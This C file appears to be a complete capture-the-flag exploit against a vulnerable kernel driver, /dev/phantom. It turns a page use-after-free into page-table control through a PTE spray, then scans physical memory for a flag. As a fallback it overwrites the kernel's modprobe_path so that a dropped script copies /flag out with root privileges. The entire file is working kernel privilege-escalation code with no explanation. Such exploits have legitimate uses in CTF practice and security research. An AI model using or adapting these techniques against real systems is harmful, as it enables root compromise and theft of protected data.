#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <string.h>
#include <stdint.h>
#include <sys/wait.h>
#include <sys/stat.h>

#define CMD_ALLOC 0x133701
#define CMD_FREE  0x133702
#define PAGE_SIZE 0x1000
#define N_SPRAY   256
#define RAM_PAGES 65536

int main(void)
{
    int fd = open("/dev/phantom", O_RDWR);
    if (fd < 0) { perror("open"); return 1; }

    puts("[*] Phantom: Page UAF -> PTE -> phys scan");

    /* Step 1: page UAF */
    ioctl(fd, CMD_ALLOC, 0);
    uint64_t *uaf = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE,
                         MAP_SHARED, fd, 0);
    if (uaf == MAP_FAILED) { perror("mmap"); return 1; }
    printf("[*] UAF at %p\n", uaf);
    ioctl(fd, CMD_FREE, 0);
    close(fd);

    /* Step 2: PTE spray */
    void *sprays[N_SPRAY];
    for (int i = 0; i < N_SPRAY; i++) {
        sprays[i] = mmap(NULL, 512 * PAGE_SIZE, PROT_READ | PROT_WRITE,
                         MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        if (sprays[i] == MAP_FAILED) continue;
        madvise(sprays[i], 512 * PAGE_SIZE, MADV_NOHUGEPAGE);
        *(volatile uint64_t *)sprays[i] = 0xDEAD000000000000ULL | i;
    }

    /* Step 3: Find PTE */
    int target_idx = -1;
    for (int i = 0; i < 512; i++) {
        uint64_t e = uaf[i];
        if (e && (e & 1) && (e & 4) && (e & 0x000FFFFFFFFFF000ULL)) {
            target_idx = i;
            break;
        }
    }
    if (target_idx < 0) { puts("[-] No PTE"); return 1; }

    uint64_t pte_flags = uaf[target_idx] & 0x8000000000000FFFULL;
    printf("[*] PTE[%d] flags=0x%lx\n", target_idx, pte_flags);

    /* Step 4: Identify victim */
    uint64_t saved[512];
    for (int i = 0; i < 512; i++) saved[i] = uaf[i];
    for (int i = 0; i < 512; i++) uaf[i] = (1ULL << 12) | pte_flags;
    getpid();

    void *victim = NULL;
    for (int i = 0; i < N_SPRAY; i++) {
        if (sprays[i] == MAP_FAILED) continue;
        uint64_t val = *(volatile uint64_t *)sprays[i];
        if (val != (0xDEAD000000000000ULL | i)) {
            victim = sprays[i];
            printf("[+] Victim: spray[%d] at %p\n", i, victim);
            break;
        }
    }
    for (int i = 0; i < 512; i++) uaf[i] = saved[i];
    getpid();
    if (!victim) { puts("[-] No victim"); return 1; }

    char *scan_base = (char *)victim - (uint64_t)target_idx * PAGE_SIZE;

    /* Step 5: Scan physical memory */
    puts("[*] Scanning physical memory...");
    int flag_found = 0;
    uint64_t mp_pfn = 0;
    int mp_off = -1;

    for (uint64_t batch = 0; batch < RAM_PAGES / 512; batch++) {
        uint64_t bpfn = batch * 512;
        for (int i = 0; i < 512; i++)
            uaf[i] = ((bpfn + i) << 12) | pte_flags;
        getpid();

        for (int i = 0; i < 512; i++) {
            char *p = scan_base + i * PAGE_SIZE;
            for (int off = 0; off <= PAGE_SIZE - 6; off++) {
                /* Search for flag: 0XFUN{ or 0xfun{ */
                if ((p[off] == '0') &&
                    (p[off+1] == 'X' || p[off+1] == 'x') &&
                    (p[off+2] == 'F' || p[off+2] == 'f') &&
                    (p[off+3] == 'U' || p[off+3] == 'u') &&
                    (p[off+4] == 'N' || p[off+4] == 'n') &&
                    p[off+5] == '{') {
                    char fl[256] = {0};
                    int len;
                    for (len = 0; off+len < PAGE_SIZE && p[off+len] &&
                         p[off+len] != '\n' && len < 255; len++)
                        fl[len] = p[off+len];
                    fl[len] = 0;
                    printf("\n[+] FLAG @ PFN %lu+0x%x: %s\n", bpfn+i, off, fl);
                    flag_found = 1;
                }
                if (off <= PAGE_SIZE - 15 && mp_off < 0 &&
                    memcmp(p+off, "/sbin/modprobe", 14) == 0) {
                    mp_pfn = bpfn + i;
                    mp_off = off;
                }
            }
        }
    }

    if (flag_found) {
        puts("[+] Done!");
        return 0;
    }

    /* Fallback: modprobe_path */
    if (mp_off >= 0) {
        printf("[*] modprobe @ PFN %lu+0x%x, overwriting...\n", mp_pfn, mp_off);

        uaf[0] = (mp_pfn << 12) | pte_flags;
        getpid();
        char *p = scan_base;
        strcpy(p + mp_off, "/tmp/x");

        for (int i = 0; i < 512; i++) uaf[i] = saved[i];
        getpid();

        /* Create /tmp/x with execute permissions using open() */
        int sfd = open("/tmp/x", O_WRONLY | O_CREAT | O_TRUNC, 0777);
        if (sfd >= 0) {
            const char *script = "#!/bin/sh\ncat /flag > /tmp/flag\nchmod 777 /tmp/flag\n";
            write(sfd, script, strlen(script));
            close(sfd);
        }
        /* Force chmod in case umask restricted it */
        chmod("/tmp/x", 0777);

        /* Create trigger with unknown binary format */
        int tfd = open("/tmp/trigger", O_WRONLY | O_CREAT | O_TRUNC, 0777);
        if (tfd >= 0) {
            write(tfd, "\xff\xff\xff\xff", 4);
            close(tfd);
        }
        chmod("/tmp/trigger", 0777);

        /* Execute trigger - kernel calls modprobe_path on unknown format */
        printf("[*] Triggering modprobe...\n");
        pid_t pid = fork();
        if (pid == 0) {
            execve("/tmp/trigger", (char *[]){"/tmp/trigger", NULL},
                   (char *[]){NULL});
            _exit(1);
        }
        if (pid > 0) waitpid(pid, NULL, 0);
        usleep(1000000);

        /* Try reading flag */
        int ffd = open("/tmp/flag", O_RDONLY);
        if (ffd >= 0) {
            char buf[256] = {0};
            read(ffd, buf, 255);
            close(ffd);
            printf("[+] FLAG: %s\n", buf);
        } else {
            /* Maybe the script path is wrong, try system() */
            puts("[*] Trying system() fallback...");
            system("cat /tmp/flag 2>&1 || echo 'no flag'");
            system("ls -la /tmp/ 2>&1");
        }
    } else {
        puts("[-] Nothing found");
    }

    return 0;
}
